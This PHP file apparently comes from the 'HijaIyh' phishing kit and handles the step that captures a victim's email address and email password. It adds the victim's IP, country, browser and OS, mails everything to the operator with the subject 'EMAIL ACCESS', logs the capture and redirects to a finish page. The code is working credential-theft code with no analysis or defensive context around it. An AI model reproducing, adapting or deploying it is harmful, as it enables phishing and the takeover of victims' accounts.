<?php 
/** HijaIyh App Framework
* @author justalinko
* @version 2.1
**/
echo '<center><br><br><br><br><img src="./HijaIyh_App/assets/img/spinner2.gif" style="margin-top:20%"></center>';

if(isset($_POST))
{

	 $check = ['email','password_email'];
if($core->empty_post_array($check))
{
    $core->redirect('?page='.$core->mobile_link('email').'&appIdKey='.$appidkey.'&locale='.@$localex);
    exit;
}
	$email = $core->post('email');
	$passw = $core->post('password_email');
	$type = $core->post('type');
	$data = ['type' => strtoupper($type),'email' => $email, 'password' => $passw , 'useragent' => $_SERVER['HTTP_USER_AGENT'] ,
            'ip' => $core->userIP() , 
            'country' => $country_name , 
            'date' => date('D,d m Y H:i')];
    $info = $country_name." - ".$core->getOS()." - ".$core->userIP()." - ".$core->getBrowser();

    $sendMsg = $core->parse_result('email',$data);
    $sendSubj = "EMAIL ACCESS : ".strtoupper($email)." # $info";
    $sendFrom = "#HijaIyh:App";

   
    $core->sendmail($email_result,$sendFrom,$sendSubj,$sendMsg);
    $core->stats('email','email access : '.$email);
    $core->create_session($data);


	$core->redirect('?page='.$core->mobile_link('finish').'&appIdKey='.$appidkey.'&locale='.@$localex);
}